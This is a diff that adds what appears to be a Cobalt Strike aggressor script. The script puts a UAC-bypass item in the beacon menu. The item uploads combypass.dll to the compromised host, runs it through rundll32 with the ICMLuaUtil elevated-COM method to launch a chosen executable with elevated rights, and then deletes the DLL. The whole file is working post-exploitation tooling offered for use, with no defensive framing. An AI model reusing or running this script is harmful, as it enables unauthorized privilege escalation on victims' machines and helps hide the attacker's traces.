@@ -1,0 +1,27 @@
+sub combypassuac_{
+	btask($3['bid'], "Type: Elevated COM interface");
+	btask($3['bid'], "Method: ICMLuaUtil");
+	bupload($3['bid'], script_resource("combypass.dll"));
+	bshell($3['bid'], "rundll32 combypass.dll,MyBypassUAC $3['executepath']");
+	brm($3['bid'], "combypass.dll");
+}
+
+sub combypassuac{
+	foreach $id ($bid){
+		$dialog = dialog("COM DLL Bypassuc", %(executepath => "C:\\Windows\\System32\\cmd.exe", bid => $id), &combypassuac_);
+		dialog_description($dialog, "combypassuac #指定一个要运行的PE文件");
+		drow_text($dialog, "executepath", "executepath:");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+}
+
+popup beacon_bottom{
+	menu "&bypassuac"{
+		item "&Elevated COM Bypassuc"{
+			$bid = $1;
+			combypassuac($bid);
+		}
+	}
+
+}
